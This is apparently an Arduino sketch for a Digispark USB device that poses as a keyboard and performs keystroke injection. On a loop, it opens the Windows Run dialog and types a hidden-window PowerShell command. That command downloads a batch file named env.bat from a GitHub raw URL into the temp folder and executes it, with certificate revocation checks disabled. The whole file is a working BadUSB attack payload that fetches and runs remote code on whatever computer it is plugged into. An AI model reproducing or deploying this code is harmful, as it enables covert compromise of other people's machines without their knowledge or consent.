#include "DigiKeyboard.h"

void setup() {
    // don't need to set anything up to use DigiKeyboard
    pinMode(0, OUTPUT);
}


void loop() {
    // put your main code here, to run repeatedly:
    
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(3000);
  
    DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("powershell -windowstyle hidden cmd.exe /c \"curl --ssl-no-revoke https://raw.githubusercontent.com/r4mdev/shotter/main/env.bat -o %tmp%\\env.bat;%tmp%\\env.bat\"");
    DigiKeyboard.delay(1500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
    DigiKeyboard.delay(7000);
}
